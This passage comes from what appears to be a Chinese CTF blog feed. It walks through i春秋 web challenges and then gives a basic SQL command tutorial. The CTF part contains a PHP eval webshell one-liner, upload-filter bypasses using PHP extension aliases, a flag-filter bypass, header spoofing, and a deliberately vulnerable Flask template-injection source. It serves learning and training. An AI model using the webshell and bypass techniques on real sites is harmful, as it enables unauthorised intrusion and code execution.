class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">用户名：lixiuyun<br><br>密码：lixiuyun1990<br></code></pre></td></tr></table></figure><p>登陆成功，看源码</p><p><img src="/2024/11/15/i%E6%98%A5%E7%A7%8Bweb-Login/4.png" alt="image-20241114184251949"></p><p>直接写一个自主上传页面，进行上传木马</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>upload-POC<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://eci-2zej6uy56o6jzj9ingfq.cloudeci1.ichunqiu.com/&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span>文件名:<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span><br>    上传的文件在网站目录下<br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>上传的时候出现问题</p><p><img src="/2024/11/15/i%E6%98%A5%E7%A7%8Bweb-Login/5.png" alt="image-20241114184729673"></p><p>不知道怎么做了。后面看看其他人写的wp吧</p><p>直接上传一句话木马失败</p><p>只允许上传.jpg,.png,.gif,.bmp后缀的文件</p><p>改文件名为2.jpg，一句话内容如下</p><?php @eval($_POST[cmd]);?><p>burpsuite抓包改名为php，提示文件名不能出现php，于是改成别名pht，然后提示文件内容有问题。。。。还是上传个普通图片试试吧</p><pre><code class="hljs">php别名：php2, php3, php4, php5, phps, pht, phtm, phtml</code></pre><p>上传普通图片1.jpg依旧返回文件格式不符合要求，依旧抓包，改名为1.jpg.pht</p><p>返回了一个view.php页面，直接访问</p><p>应该是要一个file参数，构造payload</p><p><a href="http://eci-2zeft0t6zcxyaqguqhdq.cloudeci.ichunqiu.com/view.php?file=flag">http://eci-2zeft0t6zcxyaqguqhdq.cloudeci.ichunqiu.com/view.php?file=flag</a></p><p>在这里插入图片描述</p><p>就是过滤掉flag嘛，简单，flflagag就能绕过</p><p><a href="http://eci-2zeft0t6zcxyaqguqhdq.cloudeci.ichunqiu.com/view.php?file=flflagag">http://eci-2zeft0t6zcxyaqguqhdq.cloudeci.ichunqiu.com/view.php?file=flflagag</a></p><p>成功得到flag</p><h1 id="i春秋-web-Hello"><a href="#i春秋-web-Hello" class="headerlink" title="i春秋 web Hello"></a>i春秋 web Hello</h1><p>访问源代码</p><p><img src="/2024/11/15/i%E6%98%A5%E7%A7%8Bweb-Login/6.png" alt="image-20241114190946965"></p><p>发现提示，访问看看，是base64编码，解码后得到源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,request,render_template<br><span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> Template<br><span class="hljs-keyword">import</span> os<br><br>app = Flask(__name__)<br><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>flag = f.read()<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">home</span>():<br>    name = request.args.get(<span class="hljs-string">&quot;name&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(name)<br>    <span class="hljs-keyword">if</span> name:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>,name=name)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/help&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">help</span>():<br>    <span class="hljs-built_in">help</span> = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>        <span class="hljs-keyword">return</span> f.read()<br><br><span class="hljs-meta">@app.errorhandler(<span class="hljs-params"><span class="hljs-number">404</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">page_not_found</span>(<span class="hljs-params">e</span>):<br>    <span class="hljs-comment">#No way to get flag!</span><br>    os.system(<span class="hljs-string">&#x27;rm -f /flag&#x27;</span>)<br>    url = name = request.args.get(<span class="hljs-string">&quot;name&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-comment"># r = request.path</span><br>    r = request.data.decode(<span class="hljs-string">&#x27;utf8&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;eval&#x27;</span> <span class="hljs-keyword">in</span> r <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;popen&#x27;</span> <span class="hljs-keyword">in</span> r <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;&#123;&#123;&#x27;</span> <span class="hljs-keyword">in</span> r:<br>        t = Template(<span class="hljs-string">&quot; Not found!&quot;</span>)<br>        <span class="hljs-keyword">return</span> render_template(t), <span class="hljs-number">404</span><br>    t = Template(r + <span class="hljs-string">&quot; Not found!&quot;</span>)<br>    <span class="hljs-keyword">return</span> render_template(t), <span class="hljs-number">404</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">8888</span>)<br></code></pre></td></tr></table></figure><h1 id="i春秋-web-NOT-Found"><a href="#i春秋-web-NOT-Found" class="headerlink" title="i春秋  web NOT Found"></a>i春秋  web NOT Found</h1><p>点开网页，显示404，告诉我们404.php的存在，我们先试试404.php，打开是haha四个字母，源码和抓包都没看到什么，然后其抓包，也没什么，无功，返回原网页，抓包，没发现什么的感觉，go一遍，在response中发现了刚刚看到的haha四个字母</p><p><img src="/2024/11/15/i%E6%98%A5%E7%A7%8Bweb-Login/7.png" alt="img"></p><p>百度一下</p><p>没搜到什么。。。。据别的wp里说的好像是提示我们要注意http的请求方法。。。（具体原因也没说）</p><p>这里就继续接着写吧</p><p>据菜鸟教程，http有9种请求方法</p><p><img src="/2024/11/15/i%E6%98%A5%E7%A7%8Bweb-Login/8.png" alt="img"></p><p>而这里就在抓到的包种逐个修改http请求类型进行尝试</p><p><img src="/2024/11/15/i%E6%98%A5%E7%A7%8Bweb-Login/9.png" alt="img"></p><p>发现当http以options的形式进行请求时出现了文件查询的操作</p><p>去url中试试访问&#x2F;1.php，结果not here plz trying，意思是不在这里，请尝试其他方法。</p><p>。。。。无果，在url中加入&#x2F;?f&#x3D;1.php试试，没什么显示，查源码，没东西，抓包</p><p><img src="/2024/11/15/i%E6%98%A5%E7%A7%8Bweb-Login/10.png" alt="img"></p><p>正常返回了，也许这里能读取文件，就试试</p><p>将OPTIONS后面的文件改为flag.php。。。。。不行</p><p>据别的wp里说这里是apache搭建的网页所以根目录里通常有.htaccess配置文件。。。</p><p>反正我是没找到哪里说的是apache搭建的。。。</p><p>百度了一下，似乎是通过HEAD来判断的，这个操作我还不会</p><p><img src="/2024/11/15/i%E6%98%A5%E7%A7%8Bweb-Login/11.png" alt="img"></p><p>好吧，先展示不管，继续做题</p><p>直接?f&#x3D;.htaccess</p><p><img src="/2024/11/15/i%E6%98%A5%E7%A7%8Bweb-Login/12.png" alt="img"></p><p>又是两个文件，访问试试。。。。。</p><ol><li>php可以，不过前面那个文件不能这样读取，需要直接在url中读取就行了</li></ol><p>直接访问</p><p><a href="http://cef7f0c8632e43258f888464969719bf0bb798612a0c46b2.changame.ichunqiu.com/8d829d8568e46455104209db5cd9228d.html">http://cef7f0c8632e43258f888464969719bf0bb798612a0c46b2.changame.ichunqiu.com/8d829d8568e46455104209db5cd9228d.html</a></p><p>提示我们</p><p><img src="/2024/11/15/i%E6%98%A5%E7%A7%8Bweb-Login/13.png" alt="img"></p><p>Ip不正确，然后询问我们的XFF（网页中的一个设置）</p><p>所以这里抓包进行修改</p><p>先尝试传入本地ip：X-Forwarded-For:127.0.0.1（不行），他提示了我们XFF的。。。</p><p>所以这里还有一种方法client-ip:127.0.0.1</p><p>Success！</p><p>拿到flag</p><h1 id="i春秋-web-Backdoor"><a href="#i春秋-web-Backdoor" class="headerlink" title="i春秋  web Backdoor"></a>i春秋  web Backdoor</h1>]]></content>
    
    
    
    <tags>
      
      <tag>i春秋刷题记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql语句</title>
    <link href="/2024/11/01/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/2024/11/01/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<h1 id="SQL概述"><a href="#SQL概述" class="headerlink" title="SQL概述:"></a>SQL概述:</h1><p><img src="/2024/11/01/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/SQL.png" alt="SQL"></p><h1 id="一些最重要的-SQL-命令"><a href="#一些最重要的-SQL-命令" class="headerlink" title="一些最重要的 SQL 命令"></a>一些最重要的 SQL 命令</h1><p>1、SQL，指结构化查询语言，全称是 Structured Query Language。用于访问和处理数据库的标准的计算机语言。</p><p>2、SQL 对大小写不敏感：SELECT 与 select 是相同的。</p><p>3、重要的sql命令：</p><p>SELECT - 从数据库中提取数据</p><p>UPDATE - 更新数据库中的数据</p><p>DELETE - 从数据库中删除数据</p><p>INSERT INTO - 向数据库中插入新数据</p><p>CREATE DATABASE - 创建新数据库</p><p>ALTER DATABASE - 修改数据库</p><p>CREATE TABLE - 创建新表</p><p>ALTER TABLE - 变更（改变）数据库表</p><p>DROP TABLE - 删除表</p><p>CREATE INDEX - 创建索引（搜索键）</p><p>DROP INDEX - 删除索引</p><p>4.更新数据操作：</p><p>（1）NOT NULL - 指示某列不能存储 NULL 值。</p><p>（2）UNIQUE - 保证某列的每行必须有唯一的值。</p><p>（3）PRIMARY KEY - NOT NULL 和 UNIQUE 的结合。确保某列（或两个列多个列的结合）有唯一标识，有助于更容易更快速地找到表中的一个特定的记录。</p><p>（4）FOREIGN KEY - 保证一个表中的数据匹配另一个表中的值的参照完整性。</p><p>（5）CHECK - 保证列中的值符合指定的条件。</p><p>（6）DEFAULT - 规定没有给列赋值时的默认值。</p><h1 id="SQL命令"><a href="#SQL命令" class="headerlink" title="SQL命令"></a>SQL命令</h1><h3 id="1、创建数据库"><a href="#1、创建数据库" class="headerlink" title="1、创建数据库"></a>1、创建数据库</h3><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">DATABASE</span> &lt;数据库名&gt;;<br>eg:  <span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">DATABASE</span> mytest;<br></code></pre></td></tr></table></figure><h3 id="2、查看所有数据库"><a href="#2、查看所有数据库" class="headerlink" title="2、查看所有数据库"></a>2、查看所有数据库</h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">show databases<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h3 id="3、删除数据库"><a href="#3、删除数据库" class="headerlink" title="3、删除数据库"></a>3、删除数据库</h3><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">drop</span> <span class="hljs-keyword">database</span> &lt;数据库名&gt;;<br>eg:  <span class="hljs-keyword">drop</span> <span class="hljs-keyword">database</span> mytest;<br></code></pre></td></tr></table></figure><h3 id="4、选择数据库"><a href="#4、选择数据库" class="headerlink" title="4、选择数据库"></a>4、选择数据库</h3><figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs openscad"><span class="hljs-meta"><span class="hljs-keyword">use</span> &lt;数据库名&gt;</span>；<br>eg:   <span class="hljs-keyword">use</span> mytest；<br></code></pre></td></tr></table></figure><h3 id="5、设置使用的字符集"><a href="#5、设置使用的字符集" class="headerlink" title="5、设置使用的字符集"></a>5、设置使用的字符集</h3><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> names <span class="hljs-comment">utf8</span><br></code></pre></td></tr></table></figure><h3 id="6、创建数据表"><a href="#6、创建数据表" class="headerlink" title="6、创建数据表"></a>6、创建数据表</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-built_in">table_name</span> (<span class="hljs-built_in">column_name</span> column_type);<br></code></pre></td></tr></table></figure><h3 id="7-INSERT-INTO-语句"><a href="#7-INSERT-INTO-语句" class="headerlink" title="7  INSERT INTO 语句"></a>7  INSERT INTO 语句</h3><p>INSERT INTO 语句可以有两种编写形式。</p><p>第一种形式无需指定要插入数据的列名，只需提供被插入的值即可：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> table_name<br><span class="hljs-keyword">VALUES</span> (value1,value2,value3,...);<br></code></pre></td></tr></table></figure><p>第二种形式需要指定列名及被插入的值：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> table_name (column1,column2,column3,...)<br><span class="hljs-keyword">VALUES</span> (value1,value2,value3,...);<br><br>table_name<span class="hljs-operator">*</span><span class="hljs-operator">*</span>：需要插入新记录的表名。<br><br>column1, column2, ...<span class="hljs-operator">*</span><span class="hljs-operator">*</span>：需要插入的字段名。<br><br>value1, value2, ...<span class="hljs-operator">*</span><span class="hljs-operator">*</span>：需要插入的字段值。<br></code></pre></td></tr></table></figure><p>eg：</p><table><thead><tr><th>id</th><th>name</th><th>url</th><th>alexa</th><th>country</th></tr></thead><tbody><tr><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><table><thead><tr><th>1</th><th>Google</th><th><a href="https://www.google.cm/">https://www.google.cm/</a></th><th>1</th><th>USA</th></tr></thead><tbody><tr><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><table><thead><tr><th>2</th><th>淘宝</th><th><a href="https://www.taobao.com/">https://www.taobao.com/</a></th><th>13</th><th>CN</th></tr></thead><tbody><tr><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><table><thead><tr><th>3</th><th>菜鸟教程</th><th><a href="http://www.runoob.com/">http://www.runoob.com/</a></th><th>4689</th><th>CN</th></tr></thead><tbody><tr><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><table><thead><tr><th>4</th><th>微博</th><th><a href="http://weibo.com/">http://weibo.com/</a></th><th>20</th><th>CN</th></tr></thead><tbody><tr><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><table><thead><tr><th>5</th><th>Facebook</th><th><a href="https://www.facebook.com/">https://www.facebook.com/</a></th><th>3</th><th>USA</th></tr></thead><tbody><tr><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>实例：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> Websites (<span class="hljs-type">name</span>, url, alexa, country) <span class="hljs-keyword">VALUES</span> (<span class="hljs-string">&#x27;百度&#x27;</span>,<span class="hljs-string">&#x27;https://www.baidu.com/&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>,<span class="hljs-string">&#x27;CN&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="8、查看当前数据库中的所有表"><a href="#8、查看当前数据库中的所有表" class="headerlink" title="8、查看当前数据库中的所有表"></a>8、查看当前数据库中的所有表</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">tables</span>;<br></code></pre></td></tr></table></figure><h3 id="9、查看表结构"><a href="#9、查看表结构" class="headerlink" title="9、查看表结构"></a>9、查看表结构</h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">DESC &lt;表名&gt;<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h3 id="10、查询数据"><a href="#10、查询数据" class="headerlink" title="10、查询数据"></a>10、查询数据</h3><h5 id="（1）基本查询"><a href="#（1）基本查询" class="headerlink" title="（1）基本查询"></a>（1）基本查询</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">SELECT</span> * <span class="hljs-selector-tag">FROM</span> &lt;表名&gt;；<br></code></pre></td></tr></table></figure><h5 id="（2）投影查询-指在-SQL-查询中只选择特定的列（字段）"><a href="#（2）投影查询-指在-SQL-查询中只选择特定的列（字段）" class="headerlink" title="（2）投影查询:指在 SQL 查询中只选择特定的列（字段）"></a>（2）投影查询:指在 SQL 查询中只选择特定的列（字段）</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">column_name</span>,<span class="hljs-built_in">column_name</span><br><span class="hljs-keyword">FROM</span> <span class="hljs-built_in">table_name</span>;<br></code></pre></td></tr></table></figure><h5 id="（3）DISTINCT查询结果返回唯一值"><a href="#（3）DISTINCT查询结果返回唯一值" class="headerlink" title="（3）DISTINCT查询结果返回唯一值"></a>（3）DISTINCT查询结果返回唯一值</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DISTINCT</span> <span class="hljs-built_in">column_name</span>,<span class="hljs-built_in">column_name</span><br><span class="hljs-keyword">FROM</span> <span class="hljs-built_in">table_name</span>;<br><span class="hljs-keyword">DISTINCT</span> 是修饰符，表示查询结果中只返回不同的值。它会去除重复的记录。<br></code></pre></td></tr></table></figure><h5 id="（4）条件查询WHERE"><a href="#（4）条件查询WHERE" class="headerlink" title="（4）条件查询WHERE"></a>（4）条件查询WHERE</h5><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> &lt;表名&gt; <span class="hljs-keyword">WHERE</span> &lt;条件表达式&gt;；<br><br><span class="hljs-symbol">eg:</span><br><span class="hljs-keyword">SELECT</span> * <br><span class="hljs-keyword">FROM</span> Employees <br><span class="hljs-keyword">WHERE</span> age &gt; <span class="hljs-number">30</span>;<br></code></pre></td></tr></table></figure><h5 id="（5）排序ASC-DESC"><a href="#（5）排序ASC-DESC" class="headerlink" title="（5）排序ASC|DESC"></a>（5）排序ASC|DESC</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> column_name,column_name<br><span class="hljs-keyword">FROM</span> table_name<br><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> column_name,column_name <span class="hljs-keyword">ASC</span><span class="hljs-operator">|</span><span class="hljs-keyword">DESC</span>;<br><br><br><span class="hljs-keyword">ASC</span> 表示升序（默认），即从小到大排列。<br><span class="hljs-keyword">DESC</span> 表示降序，即从大到小排列。<br>可以在每个列后面单独指定排序方式，例如：column_name1 <span class="hljs-keyword">ASC</span>, column_name2 <span class="hljs-keyword">DESC</span>。<br>eg:升序排序<br><span class="hljs-keyword">SELECT</span> product_id, product_name <br><span class="hljs-keyword">FROM</span> Products <br><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> price <span class="hljs-keyword">ASC</span>;<br></code></pre></td></tr></table></figure><p>假设有一个名为 <code>Products</code> 的表，结构如下：</p><table><thead><tr><th>product_id</th><th>product_name</th><th>price</th><th>category</th></tr></thead><tbody><tr><td>1</td><td>Laptop</td><td>1200</td><td>Electronics</td></tr><tr><td>2</td><td>Phone</td><td>800</td><td>Electronics</td></tr><tr><td>3</td><td>Tablet</td><td>600</td><td>Electronics</td></tr><tr><td>4</td><td>Chair</td><td>150</td><td>Furniture</td></tr></tbody></table><p>对于升序：</p><table><thead><tr><th>product_id</th><th>product_name</th></tr></thead><tbody><tr><td>4</td><td>Chair</td></tr><tr><td>3</td><td>Tablet</td></tr><tr><td>2</td><td>Phone</td></tr><tr><td>1</td><td>Laptop</td></tr></tbody></table><h5 id="（6）分页查询LIMIT-number-OFFSET"><a href="#（6）分页查询LIMIT-number-OFFSET" class="headerlink" title="（6）分页查询LIMIT number OFFSET"></a>（6）分页查询LIMIT number OFFSET</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">column_name</span>(s)<br><span class="hljs-keyword">FROM</span> <span class="hljs-built_in">table_name</span><br><span class="hljs-keyword">LIMIT</span> number <span class="hljs-keyword">OFFSET</span> 起始值;<br></code></pre></td></tr></table></figure><p>eg:</p><p>假设有一个名为 <code>Employees</code> 的表，结构如下：</p><table><thead><tr><th>id</th><th>name</th><th>age</th><th align="right">department</th></tr></thead><tbody><tr><td>1</td><td>Alice</td><td>30</td><td align="right">HR</td></tr><tr><td>2</td><td>Bob</td><td>25</td><td align="right">IT</td></tr><tr><td>3</td><td>Charlie</td><td>35</td><td align="right">HR</td></tr><tr><td>4</td><td>David</td><td>28</td><td align="right">IT</td></tr><tr><td>5</td><td>Eva</td><td>22</td><td align="right">HR</td></tr></tbody></table><p>如果你想查询前两名员工，可以使用以下 SQL 语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> id, name <br><span class="hljs-keyword">FROM</span> Employees <br>LIMIT <span class="hljs-number">2</span>;<br></code></pre></td></tr></table></figure><p>如果你想从第三条记录开始，返回两名员工，可以写成：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> id, name <br><span class="hljs-keyword">FROM</span> Employees <br>LIMIT <span class="hljs-number">2</span> <span class="hljs-keyword">OFFSET</span> <span class="hljs-number">2</span>;<br><span class="hljs-keyword">OFFSET</span> 用于指定查询结果的起始位置。<br>起始值 是一个整数，表示从结果的第几条记录开始返回（从 <span class="hljs-number">0</span> 开始计数）。<br></code></pre></td></tr></table></figure><p>对于前两名员工的查询结果：</p><table><thead><tr><th>id</th><th>name</th></tr></thead><tbody><tr><td>1</td><td>Alice</td></tr><tr><td>2</td><td>Bob</td></tr></tbody></table><p>对于从第三条记录开始的查询结果：</p><table><thead><tr><th>id</th><th>name</th></tr></thead><tbody><tr><td>3</td><td>Charlie</td></tr><tr><td>4</td><td>David</td></tr></tbody></table><h5 id="（7）聚合查询-使用聚合函数对一组数据进行汇总计算的查询，用一些函数"><a href="#（7）聚合查询-使用聚合函数对一组数据进行汇总计算的查询，用一些函数" class="headerlink" title="（7）聚合查询 使用聚合函数对一组数据进行汇总计算的查询，用一些函数"></a>（7）聚合查询 使用聚合函数对一组数据进行汇总计算的查询，用一些函数</h5><h6 id="1、COUNT-统计一张表的数据量"><a href="#1、COUNT-统计一张表的数据量" class="headerlink" title="1、COUNT()统计一张表的数据量"></a>1、COUNT()统计一张表的数据量</h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>)  <span class="hljs-keyword">FROM</span> <span class="hljs-operator">&lt;</span>表名<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-operator">&lt;</span>条件表达式<span class="hljs-operator">&gt;</span>；<br><span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>) 是一个聚合函数，用于计算结果集中的总行数。<span class="hljs-operator">*</span> 表示计算所有行，不管列的内容。<br></code></pre></td></tr></table></figure><p>eg：</p><p>假设有一个名为 <code>Employees</code> 的表，结构如下：</p><table><thead><tr><th>id</th><th>name</th><th>age</th><th>department</th></tr></thead><tbody><tr><td>1</td><td>Alice</td><td>30</td><td>HR</td></tr><tr><td>2</td><td>Bob</td><td>25</td><td>IT</td></tr><tr><td>3</td><td>Charlie</td><td>35</td><td>HR</td></tr><tr><td>4</td><td>David</td><td>28</td><td>IT</td></tr><tr><td>5</td><td>Eva</td><td>22</td><td>HR</td></tr></tbody></table><p>如果你想计算部门为 HR 的员工总数，可以使用以下 SQL 语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 